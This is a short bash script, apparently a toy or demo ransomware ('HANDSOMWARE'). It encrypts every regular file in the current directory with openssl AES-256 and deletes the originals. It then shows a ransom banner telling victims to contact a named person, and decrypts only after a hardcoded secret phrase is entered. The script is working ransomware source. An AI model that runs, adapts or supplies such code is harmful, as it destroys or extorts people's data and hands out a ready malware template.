#!/bin/bash
set -e

SCRIPT_NAME="$(basename "$0")"
KEY_FILE="thekey.key"
SECRET_PHRASE="mr_robot"

files=()

# ------------------ ENCRYPTION PHASE ------------------

for file in *; do
    [[ -f "$file" ]] || continue

    # Exclusions
    if [[ "$file" == "$SCRIPT_NAME" || "$file" == "$KEY_FILE" || "$file" == *.enc ]]; then
        continue
    fi

    files+=("$file")
done

if [[ ${#files[@]} -eq 0 ]]; then
    echo "No files to encrypt."
    exit 0
fi

echo "Files detected:"
echo "[${files[*]}]"
echo

# Generate key only once
if [[ ! -f "$KEY_FILE" ]]; then
    echo "Generating AES-256 key..."
    openssl rand 32 > "$KEY_FILE"
else
    echo "Using existing key."
fi

echo
for file in "${files[@]}"; do
    echo "Encrypting: $file"

    openssl enc -aes-256-cbc \
        -salt \
        -md sha256 \
        -in "$file" \
        -out "$file.enc" \
        -pass file:"$KEY_FILE"

    rm -f "$file"
done

echo
echo "ALL FILES ENCRYPTED SUCCESSFULLY"
sleep 2

# ------------------ BANNER ------------------

clear
echo "=============================================="
echo "  YOUR FILES ARE ENCRYPTED BY HANDSOMWARE"
echo
echo "  If you want to decrypt then contact"
echo "  pushpak3504 for secret phrase"
echo "=============================================="
echo

# ------------------ DECRYPTION PHASE ------------------

read -s -p "Enter the Secret Phrase to Decrypt Your Files: " USER_PHRASE
echo

if [[ "$USER_PHRASE" != "$SECRET_PHRASE" ]]; then
    echo "Sorry, Wrong Secret Phrase"
    exit 1
fi

echo
echo "Secret phrase verified."
echo "Starting decryption..."
echo

found=false

for file in *.enc; do
    [[ -f "$file" ]] || continue
    found=true

    original="${file%.enc}"
    echo "Decrypting: $file"

    openssl enc -d -aes-256-cbc \
        -md sha256 \
        -in "$file" \
        -out "$original" \
        -pass file:"$KEY_FILE"

    rm -f "$file"
done

if [[ "$found" = false ]]; then
    echo "No encrypted files found."
    exit 0
fi

echo
echo "Congratulations, Your Files are Decrypted. Enjoy!!"
